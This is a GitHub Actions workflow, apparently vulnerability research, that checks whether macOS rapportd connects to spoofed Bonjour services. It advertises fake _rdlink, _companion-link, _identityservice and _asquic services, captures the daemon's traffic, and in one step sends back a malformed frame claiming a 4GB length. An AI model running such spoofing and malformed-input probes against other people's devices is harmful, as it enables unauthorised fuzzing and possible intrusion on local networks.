name: rdlink PoC Probe - Does rapportd Connect to Arbitrary Services?

on:
  workflow_dispatch:

jobs:
  probe:
    runs-on: macos-15
    timeout-minutes: 15
    steps:
      - name: Setup Python listener and Bonjour advertisement
        run: |
          pip3 install zeroconf 2>/dev/null | tail -1 || true

          # Start a TCP listener on port 9999 that captures all incoming data
          python3 -c "
import socket, threading, time, struct, sys

received_data = []
connections = []

def handle_conn(conn, addr):
    print(f'[+] Connection from {addr}', flush=True)
    connections.append((conn, addr))
    try:
        conn.settimeout(5)
        while True:
            data = conn.recv(4096)
            if not data:
                break
            print(f'[+] Received {len(data)} bytes from {addr}:', flush=True)
            # Print hex dump
            for i in range(0, len(data), 16):
                chunk = data[i:i+16]
                hex_part = ' '.join(f'{b:02x}' for b in chunk)
                ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                print(f'  {i:04x}: {hex_part:<48}  {ascii_part}', flush=True)
            received_data.append(data)
    except Exception as e:
        print(f'[+] Connection ended: {e}', flush=True)
    finally:
        conn.close()

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 9999))
srv.listen(5)
srv.settimeout(1)
print(f'[+] Listening on port 9999', flush=True)

end_time = time.time() + 30
while time.time() < end_time:
    try:
        conn, addr = srv.accept()
        t = threading.Thread(target=handle_conn, args=(conn, addr))
        t.daemon = True
        t.start()
    except socket.timeout:
        pass

print(f'[+] Done. Total connections: {len(connections)}, Total data received: {sum(len(d) for d in received_data)} bytes', flush=True)
if received_data:
    print('[+] PROTO FRAMES CAPTURED - rapportd connected to us!', flush=True)
else:
    print('[-] No data received - rapportd did not connect', flush=True)
" &
          LISTENER_PID=$!

          sleep 2

          echo "=== CURRENT HOST IP ==="
          ipconfig getifaddr en0 2>/dev/null || ifconfig en0 | grep "inet " | awk '{print $2}'

          echo ""
          echo "=== ADVERTISING _rdlink._tcp on port 9999 ==="
          # Use dns-sd to advertise the service
          dns-sd -R "TestRapportDevice" _rdlink._tcp local 9999 "rpfl=0" &
          DNS_PID=$!
          echo "dns-sd PID: $DNS_PID"

          echo ""
          echo "=== ALSO ADVERTISING _companion-link._tcp ==="
          dns-sd -R "TestCompanion" _companion-link._tcp local 9999 "rpfl=0" &
          DNS_PID2=$!

          echo ""
          echo "=== WAITING 25 SECONDS FOR rapportd TO CONNECT ==="
          sleep 25

          kill $DNS_PID $DNS_PID2 2>/dev/null || true
          wait $LISTENER_PID 2>/dev/null || true

      - name: Check if rapportd tried to connect - system logs
        run: |
          echo "=== rapportd LOGS (last 60 seconds) ==="
          log show --predicate 'process == "rapportd"' --last 1m 2>/dev/null | grep -iE "(rdlink|remote.display|bonjour|connect|unauth|found.device|TestRapport)" | head -50 || true

          echo ""
          echo "=== NETWORK CONNECTIONS BY rapportd ==="
          lsof -p $(pgrep rapportd 2>/dev/null | head -1) -i 2>/dev/null | grep -i "9999\|LISTEN\|ESTABLISHED" | head -20 || true

          echo ""
          echo "=== ALL RAPPORTD PROCESS INFO ==="
          pgrep -la rapportd 2>/dev/null || true
          ps aux | grep rapportd | grep -v grep | head -5

      - name: Advertise _identityservice._tcp and capture response
        run: |
          python3 -c "
import socket, threading, time

received = []

def handle(conn, addr):
    print(f'[IDENTITY] Connection from {addr}')
    try:
        conn.settimeout(8)
        data = conn.recv(8192)
        if data:
            print(f'[IDENTITY] Got {len(data)} bytes:')
            for i in range(0, len(data), 16):
                chunk = data[i:i+16]
                hex_p = ' '.join(f'{b:02x}' for b in chunk)
                asc_p = ''.join(chr(b) if 32<=b<127 else '.' for b in chunk)
                print(f'  {i:04x}: {hex_p:<48}  {asc_p}')
            received.append(data)
            # Try sending a malformed frame back
            # Claim 4GB frame, send only 4 bytes payload
            malformed = bytes([0xFF,0xFF,0xFF,0xFF, 0x01, 0x00, 0x00, 0x00])
            conn.send(malformed)
            print('[IDENTITY] Sent malformed frame')
            time.sleep(2)
            data2 = conn.recv(4096)
            if data2:
                print(f'[IDENTITY] Response after malformed: {len(data2)} bytes')
                for i in range(0, len(data2), 16):
                    chunk = data2[i:i+16]
                    print(f'  {i:04x}: {\" \".join(f\"{b:02x}\" for b in chunk)}')
    except Exception as e:
        print(f'[IDENTITY] Error: {e}')
    finally:
        conn.close()

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 9998))
srv.listen(5)
srv.settimeout(1)
print('[IDENTITY] Listener on 9998')

import subprocess
dns = subprocess.Popen(['dns-sd', '-R', 'TestIdentSvc', '_identityservice._tcp', 'local', '9998'])

end = time.time() + 30
while time.time() < end:
    try:
        conn, addr = srv.accept()
        threading.Thread(target=handle, args=(conn,addr), daemon=True).start()
    except socket.timeout:
        pass

dns.terminate()
print(f'Total received: {sum(len(d) for d in received)} bytes')
if received:
    print('SUCCESS: rapportd connected to _identityservice._tcp!')
" 2>&1

      - name: Browse for actual _rdlink._tcp services in environment
        run: |
          echo "=== BROWSE FOR _rdlink._tcp ON LOCAL NET ==="
          timeout 10 dns-sd -B _rdlink._tcp local 2>/dev/null || true

          echo ""
          echo "=== BROWSE FOR _companion-link._tcp ==="
          timeout 10 dns-sd -B _companion-link._tcp local 2>/dev/null || true

          echo ""
          echo "=== BROWSE FOR _identityservice._tcp ==="
          timeout 10 dns-sd -B _identityservice._tcp local 2>/dev/null || true

          echo ""
          echo "=== rapportd MACH PORTS (what it's registered for) ==="
          launchctl list com.apple.rapportd 2>/dev/null | head -20 || true

          echo ""
          echo "=== rapportd BONJOUR REGISTRATIONS (from lsof) ==="
          # Check if rapportd has any mDNSResponder registrations
          lsof -p $(pgrep rapportd | head -1) 2>/dev/null | grep -i "mDNS\|bonjour\|mdns" | head -20 || true

      - name: Probe _asquic._udp (Apple QUIC transport)
        run: |
          echo "=== _asquic._udp PROBE ==="
          # Set up UDP listener and advertise the QUIC service
          python3 -c "
import socket, time, subprocess

# Listen for incoming QUIC Initial packets
srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 9997))
srv.settimeout(1)

dns = subprocess.Popen(['dns-sd', '-R', 'TestQUIC', '_asquic._udp', 'local', '9997'])
print('[QUIC] Listening on UDP 9997')

end = time.time() + 20
packets = []
while time.time() < end:
    try:
        data, addr = srv.recvfrom(65535)
        print(f'[QUIC] Got UDP packet from {addr}: {len(data)} bytes')
        for i in range(0, min(len(data), 64), 16):
            chunk = data[i:i+16]
            print(f'  {i:04x}: {\" \".join(f\"{b:02x}\" for b in chunk)}')
        packets.append((data, addr))
    except socket.timeout:
        pass

dns.terminate()
print(f'[QUIC] Total packets: {len(packets)}')
if packets:
    print('[QUIC] SUCCESS - rapportd sent QUIC Initial packet!')
" 2>&1
